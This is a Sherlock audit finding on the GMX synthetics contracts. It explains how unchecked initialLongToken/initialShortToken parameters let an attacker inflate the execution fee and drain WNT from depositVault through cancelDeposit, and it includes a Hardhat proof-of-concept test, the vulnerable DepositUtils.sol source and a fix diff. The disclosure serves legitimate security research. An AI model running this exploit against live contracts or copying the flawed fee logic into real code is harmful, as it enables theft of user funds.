{
  "Title": "H-1: WNT in depositVault can be drained by abusing initialLongToken/initialShortToken of CreateDepositParams",
  "Content": "# Issue H-1: WNT in depositVault can be drained by abusing initialLongToken/initialShortToken of CreateDepositParams \n\nSource: https://github.com/sherlock-audit/2023-02-gmx-judging/issues/205 \n\n## Found by \nbin2chen, hack3r-0m, n33k\n\n## Summary\n\nThe attacker can abuse the `initialLongToken`/`initialShortToken` of `CreateDepositParams` to drain all the WNT from depositVault.\n\n## Vulnerability Detail\n\n```solidity\n    function createDeposit(\n        DataStore dataStore,\n        EventEmitter eventEmitter,\n        DepositVault depositVault,\n        address account,\n        CreateDepositParams memory params\n    ) external returns (bytes32) {\n        Market.Props memory market = MarketUtils.getEnabledMarket(dataStore, params.market);\n\n        uint256 initialLongTokenAmount = depositVault.recordTransferIn(params.initialLongToken);\n        uint256 initialShortTokenAmount = depositVault.recordTransferIn(params.initialShortToken);\n\n        address wnt = TokenUtils.wnt(dataStore);\n\n        if (market.longToken == wnt) {\n            initialLongTokenAmount -= params.executionFee;\n        } else if (market.shortToken == wnt) {\n            initialShortTokenAmount -= params.executionFee;\n```\n\nThe `initialLongToken` and `initialShortToken` of `CreateDepositParams` can be set to any token address and there is no check for the `initialLongToken` and `initialShortToken` during `createDeposit`. The attacker can set `initialLongToken`/`initialShortToken` to a token(USDC e.g.) with less value per unit than WNT and for a market with `market.longToken == wnt` or `market.shortToken == wnt`, `params.executionFee` will be wrongly subtracted from `initialLongTokenAmount` or `initialLongTokenAmount`. This allows the attacker to have a controllable large `params.executionFee` by sending tokens with less value. By calling `cancelDeposit`, `params.executionFee` amount of WNT will be repaid to the attacker.\n\nHere is a PoC test case that drains WNT from depositVault:\n\n```diff\ndiff --git a/gmx-synthetics/test/router/ExchangeRouter.ts b/gmx-synthetics/test/router/ExchangeRouter.ts\nindex 7eca238..c40a71c 100644\n--- a/gmx-synthetics/test/router/ExchangeRouter.ts\n+++ b/gmx-synthetics/test/router/ExchangeRouter.ts\n@@ -103,6 +103,82 @@ describe(\"ExchangeRouter\", () => {\n     });\n   });\n \n+  it(\"createDepositPoC\", async () => {\n+    // simulate normal user deposit\n+    await usdc.mint(user0.address, expandDecimals(50 * 1000, 6));\n+    await usdc.connect(user0).approve(router.address, expandDecimals(50 * 1000, 6));\n+    const tx = await exchangeRouter.connect(user0).multicall(\n+      [\n+        exchangeRouter.interface.encodeFunctionData(\"sendWnt\", [depositVault.address, expandDecimals(11, 18)]),\n+        exchangeRouter.interface.encodeFunctionData(\"sendTokens\", [\n+          usdc.address,\n+          depositVault.address,\n+          expandDecimals(50 * 1000, 6),\n+        ]),\n+        exchangeRouter.interface.encodeFunctionData(\"createDeposit\", [\n+          {\n+            receiver: user0.address,\n+            callbackContract: user2.address,\n+            market: ethUsdMarket.marketToken,\n+            initialLongToken: ethUsdMarket.longToken,\n+            initialShortToken: ethUsdMarket.shortToken,\n+            longTokenSwapPath: [ethUsdMarket.marketToken, ethUsdSpotOnlyMarket.marketToken],\n+            shortTokenSwapPath: [ethUsdSpotOnlyMarket.marketToken, ethUsdMarket.marketToken],\n+            minMarketTokens: 100,\n+            shouldUnwrapNativeToken: true,\n+            executionFee,\n+            callbackGasLimit: \"200000\",\n+          },\n+        ]),\n+      ],\n+      { value: expandDecimals(11, 18) }\n+    );\n+\n+    // depositVault has WNT balance now\n+    let vaultWNTBalance = await wnt.balanceOf(depositVault.address);\n+    expect(vaultWNTBalance.eq(expandDecimals(11, 18)));\n+\n+    // user1 steal WNT from depositVault\n+    await usdc.mint(user1.address, vaultWNTBalance.add(1));\n+    await usdc.connect(user1).approve(router.address, vaultWNTBalance.add(1));\n+\n+    // Step 1. create deposit with malicious initialLongToken\n+    await exchangeRouter.connect(user1).multicall(\n+      [\n+        exchangeRouter.interface.encodeFunctionData(\"sendTokens\", [\n+          usdc.address,\n+          depositVault.address,\n+          vaultWNTBalance.add(1),\n+        ]),\n+        exchangeRouter.interface.encodeFunctionData(\"createDeposit\", [\n+          {\n+            receiver: user1.address,\n+            callbackContract: user2.address,\n+            market: ethUsdMarket.marketToken,\n+            initialLongToken: usdc.address,       // use usdc instead of WNT\n+            initialShortToken: ethUsdMarket.shortToken,\n+            longTokenSwapPath: [],\n+            shortTokenSwapPath: [],\n+            minMarketTokens: 0,\n+            shouldUnwrapNativeToken: true,\n+            executionFee: vaultWNTBalance,\n+            callbackGasLimit: \"0\",\n+          },\n+        ]),\n+      ],\n+    );\n+\n+    // Step 2. cancel deposit to drain WNT\n+    const depositKeys = await getDepositKeys(dataStore, 0, 2);\n+    // const deposit = await reader.getDeposit(dataStore.address, depositKeys[1]);\n+    // console.log(deposit);\n+    // console.log(depositKeys[1]);\n+    await expect(exchangeRouter.connect(user1).cancelDeposit(depositKeys[1]));\n+\n+    // WNT is drained from depositVault\n+    expect(await wnt.balanceOf(depositVault.address)).eq(0);\n+  });\n+\n   it(\"createOrder\", async () => {\n     const referralCode = hashString(\"referralCode\");\n     await usdc.mint(user0.address, expandDecimals(50 * 1000, 6));\n```\n\n## Impact\n\nThe malicious user can drain all WNT from depositVault.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-02-gmx/blob/main/gmx-synthetics/contracts/deposit/DepositUtils.sol#L77-L80\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n```diff\ndiff --git a/gmx-synthetics/contracts/deposit/DepositUtils.sol b/gmx-synthetics/contracts/deposit/DepositUtils.sol\nindex fae1b46..2811a6d 100644\n--- a/gmx-synthetics/contracts/deposit/DepositUtils.sol\n+++ b/gmx-synthetics/contracts/deposit/DepositUtils.sol\n@@ -74,9 +74,9 @@ library DepositUtils {\n \n         address wnt = TokenUtils.wnt(dataStore);\n \n-        if (market.longToken == wnt) {\n+        if (params.initialLongToken == wnt) {\n             initialLongTokenAmount -= params.executionFee;\n-        } else if (market.shortToken == wnt) {\n+        } else if (params.initialShortToken == wnt) {\n             initialShortTokenAmount -= params.executionFee;\n         } else {\n             uint256 wntAmount = depositVault.recordTransferIn(wnt);\n```\n\n\n\n## Discussion\n\n**xvi10**\n\nFix in https://github.com/gmx-io/gmx-synthetics/commit/4a5981a1f006468cd78dd974110d0a8be23b5fc9\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/6",
  "Code": [
    {
      "filename": "gmx-synthetics/contracts/deposit/DepositUtils.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\n\npragma solidity ^0.8.0;\n\nimport \"../data/DataStore.sol\";\nimport \"../event/EventEmitter.sol\";\n\nimport \"./DepositVault.sol\";\nimport \"./DepositStoreUtils.sol\";\nimport \"./DepositEventUtils.sol\";\n\nimport \"../nonce/NonceUtils.sol\";\n\nimport \"../gas/GasUtils.sol\";\nimport \"../callback/CallbackUtils.sol\";\nimport \"../utils/ReceiverUtils.sol\";\n\n// @title DepositUtils\n// @dev Library for deposit functions, to help with the depositing of liquidity\n// into a market in return for market tokens\nlibrary DepositUtils {\n    using SafeCast for uint256;\n    using SafeCast for int256;\n\n    using Price for Price.Props;\n    using Deposit for Deposit.Props;\n\n    // @dev CreateDepositParams struct used in createDeposit to avoid stack\n    // too deep errors\n    //\n    // @param receiver the address to send the market tokens to\n    // @param callbackContract the callback contract\n    // @param market the market to deposit into\n    // @param minMarketTokens the minimum acceptable number of liquidity tokens\n    // @param shouldUnwrapNativeToken whether to unwrap the native token when\n    // sending funds back to the user in case the deposit gets cancelled\n    // @param executionFee the execution fee for keepers\n    // @param callbackGasLimit the gas limit for the callbackContract\n    struct CreateDepositParams {\n        address receiver;\n        address callbackContract;\n        address market;\n        address initialLongToken;\n        address initialShortToken;\n        address[] longTokenSwapPath;\n        address[] shortTokenSwapPath;\n        uint256 minMarketTokens;\n        bool shouldUnwrapNativeToken;\n        uint256 executionFee;\n        uint256 callbackGasLimit;\n    }\n\n    error EmptyDeposit();\n    error InsufficientWntAmountForExecutionFee(uint256 wntAmount, uint256 executionFee);\n\n    // @dev creates a deposit\n    //\n    // @param dataStore DataStore\n    // @param eventEmitter EventEmitter\n    // @param depositVault DepositVault\n    // @param account the depositing account\n    // @param params CreateDepositParams\n    function createDeposit(\n        DataStore dataStore,\n        EventEmitter eventEmitter,\n        DepositVault depositVault,\n        address account,\n        CreateDepositParams memory params\n    ) external returns (bytes32) {\n        Market.Props memory market = MarketUtils.getEnabledMarket(dataStore, params.market);\n\n        uint256 initialLongTokenAmount = depositVault.recordTransferIn(params.initialLongToken);\n        uint256 initialShortTokenAmount = depositVault.recordTransferIn(params.initialShortToken);\n\n        address wnt = TokenUtils.wnt(dataStore);\n\n        if (market.longToken == wnt) {\n            initialLongTokenAmount -= params.executionFee;\n        } else if (market.shortToken == wnt) {\n            initialShortTokenAmount -= params.executionFee;\n        } else {\n            uint256 wntAmount = depositVault.recordTransferIn(wnt);\n            if (wntAmount < params.executionFee) {\n                revert InsufficientWntAmountForExecutionFee(wntAmount, params.executionFee);\n            }\n\n            GasUtils.handleExcessExecutionFee(\n                dataStore,\n                depositVault,\n                wntAmount,\n                params.executionFee\n            );\n        }\n\n        if (initialLongTokenAmount == 0 && initialShortTokenAmount == 0) {\n            revert EmptyDeposit();\n        }\n\n        ReceiverUtils.validateReceiver(params.receiver);\n\n        Deposit.Props memory deposit = Deposit.Props(\n            Deposit.Addresses(\n                account,\n                params.receiver,\n                params.callbackContract,\n                market.marketToken,\n                params.initialLongToken,\n                params.initialShortToken,\n                params.longTokenSwapPath,\n                params.shortTokenSwapPath\n            ),\n            Deposit.Numbers(\n                initialLongTokenAmount,\n                initialShortTokenAmount,\n                params.minMarketTokens,\n                Chain.currentBlockNumber(),\n                params.executionFee,\n                params.callbackGasLimit\n            ),\n            Deposit.Flags(\n                params.shouldUnwrapNativeToken\n            )\n        );\n\n        CallbackUtils.validateCallbackGasLimit(dataStore, deposit.callbackGasLimit());\n\n        uint256 estimatedGasLimit = GasUtils.estimateExecuteDepositGasLimit(dataStore, deposit);\n        GasUtils.validateExecutionFee(dataStore, estimatedGasLimit, params.executionFee);\n\n        bytes32 key = NonceUtils.getNextKey(dataStore);\n\n        DepositStoreUtils.set(dataStore, key, deposit);\n\n        DepositEventUtils.emitDepositCreated(eventEmitter, key, deposit);\n\n        return key;\n    }\n\n    // @dev cancels a deposit, funds are sent back to the user\n    //\n    // @param dataStore DataStore\n    // @param eventEmitter EventEmitter\n    // @param depositVault DepositVault\n    // @param key the key of the deposit to cancel\n    // @param keeper the address of the keeper\n    // @param startingGas the starting gas amount\n    function cancelDeposit(\n        DataStore dataStore,\n        EventEmitter eventEmitter,\n        DepositVault depositVault,\n        bytes32 key,\n        address keeper,\n        uint256 startingGas,\n        string memory reason,\n        bytes memory reasonBytes\n    ) external {\n        Deposit.Props memory deposit = DepositStoreUtils.get(dataStore, key);\n        if (deposit.account() == address(0)) {\n            revert EmptyDeposit();\n        }\n\n        if (deposit.initialLongTokenAmount() > 0) {\n            depositVault.transferOut(\n                deposit.initialLongToken(),\n                deposit.account(),\n                deposit.initialLongTokenAmount(),\n                deposit.shouldUnwrapNativeToken()\n            );\n        }\n\n        if (deposit.initialShortTokenAmount() > 0) {\n            depositVault.transferOut(\n                deposit.initialShortToken(),\n                deposit.account(),\n                deposit.initialShortTokenAmount(),\n                deposit.shouldUnwrapNativeToken()\n            );\n        }\n\n        DepositStoreUtils.remove(dataStore, key, deposit.account());\n\n        DepositEventUtils.emitDepositCancelled(eventEmitter, key, reason, reasonBytes);\n\n        CallbackUtils.afterDepositCancellation(key, deposit);\n\n        GasUtils.payExecutionFee(\n            dataStore,\n            depositVault,\n            deposit.executionFee(),\n            startingGas,\n            keeper,\n            deposit.account()\n        );\n    }\n}"
    }
  ]
}